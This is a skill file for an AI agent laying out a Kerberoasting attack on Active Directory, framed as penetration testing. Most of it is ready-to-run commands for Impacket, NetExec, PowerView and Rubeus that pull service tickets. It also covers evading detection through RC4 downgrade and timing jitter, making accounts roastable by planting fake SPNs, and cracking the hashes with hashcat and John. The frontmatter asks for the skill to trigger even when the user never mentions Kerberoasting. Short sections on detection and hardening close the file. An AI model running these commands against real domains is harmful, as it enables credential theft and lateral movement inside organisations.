---
name: kerberoast-attack
description: Kerberoasting attack methodology for Active Directory penetration testing. Use this skill whenever the user mentions kerberoasting, TGS ticket extraction, SPN enumeration, service account attacks, or wants to extract and crack Kerberos service tickets from AD. Also trigger for targeted kerberoast attacks, RC4/AES ticket requests, or when analyzing Event ID 4769 for detection. Make sure to use this skill for any Active Directory Kerberos service ticket attacks, even if the user doesn't explicitly say 'kerberoast'.
---

# Kerberoast Attack Methodology

Kerberoasting targets TGS tickets for services running under user accounts (accounts with SPN set). These tickets are encrypted with keys derived from the service account's password and can be cracked offline without triggering lockouts or DC telemetry.

## When to Use This Skill

- Enumerating kerberoastable users in Active Directory
- Extracting TGS tickets for offline cracking
- Converting hashes between formats (John, Hashcat)
- Performing targeted kerberoast attacks on specific users
- Analyzing Event ID 4769 for detection purposes
- Hardening service accounts against kerberoasting

## Key Concepts

- **Any authenticated domain user** can request TGS tickets - no special privileges needed
- **RC4-HMAC (etype 23)** hashes start with `$krb5tgs$23$*` - ~4.18 billion guesses/s on RTX 5090
- **AES128 (etype 17)** hashes start with `$krb5tgs$17$*` - ~6.8 million guesses/s
- **AES256 (etype 18)** hashes start with `$krb5tgs$18$*` - similar to AES128
- **Avoid spray-and-pray** - enumerate and target interesting principals first

## Attack Workflow

### 1. Enumerate Kerberoastable Users

**Linux (Impacket):**
```bash
# Request and save roastable hashes
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast

# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast

# Target specific user's SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>
```

**Linux (NetExec):**
```bash
# LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes
```

**Windows (PowerView):**
```powershell
# Get all users with SPN
Get-NetUser -SPN | Select-Object serviceprincipalname

# Request single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast

# All user SPNs to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
```

**Windows (Rubeus):**
```powershell
# Stats (AES/RC4 coverage, pwd-last-set years)
.\Rubeus.exe kerberoast /stats

# Target single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast

# Target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

### 2. OPSEC Considerations

**AES-only environments:**
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes

# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4

# Roast specific SPN with existing TGT from non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

**Throttling and noise reduction:**
- Use `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`
- Use `/delay:<ms>` and `/jitter:<1-100>` for timing
- Filter for weak passwords: `/pwdsetbefore:<MM-dd-yyyy>`
- Target privileged OUs: `/ou:<DN>`

### 3. Targeted Kerberoast (GenericWrite/GenericAll)

When you control a user object, you can add a temporary SPN to make it roastable:

**Windows:**
```powershell
# Add temporary SPN
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

**Linux (targetedKerberoast.py):**
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

### 4. Cracking

**John the Ripper:**
```bash
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast
```

**Hashcat:**
```bash
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt

# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt

# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### 5. Kerberoast Without Domain Account (AS-requested STs)

For principals without pre-authentication:

**Linux (Impacket):**
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

**Windows (Rubeus):**
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

## Detection Awareness

Kerberoasting generates **Event ID 4769** (Kerberos service ticket requested). Detection filters:

- Exclude service name `krbtgt` and names ending with `$` (computer accounts)
- Exclude requests from machine accounts (`*$$@*`)
- Only successful requests (Failure Code `0x0`)
- Track encryption types: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`)

**PowerShell triage:**
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

## Mitigation / Hardening

- Use **gMSA/dMSA** or machine accounts for services (120+ char random passwords)
- Enforce AES on service accounts: `msDS-SupportedEncryptionTypes` = 24 (decimal) / 0x18 (hex)
- Disable RC4 in environment where possible
- Remove unnecessary SPNs from user accounts
- Use long, random service account passwords (25+ chars)

## Common Issues

**Clock skew error (`KRB_AP_ERR_SKEW`):**
```bash
# Sync to DC
ntpdate <DC_IP>
# or
rdate -n <DC_IP>
```

## References

- [Matthew Green - Kerberoasting Analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [SpecterOps - Rubeus Roasting](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [Microsoft Security Blog - Kerberoast Mitigation](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [Ired.team - T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [kerberoast tools](https://github.com/nidem/kerberoast)
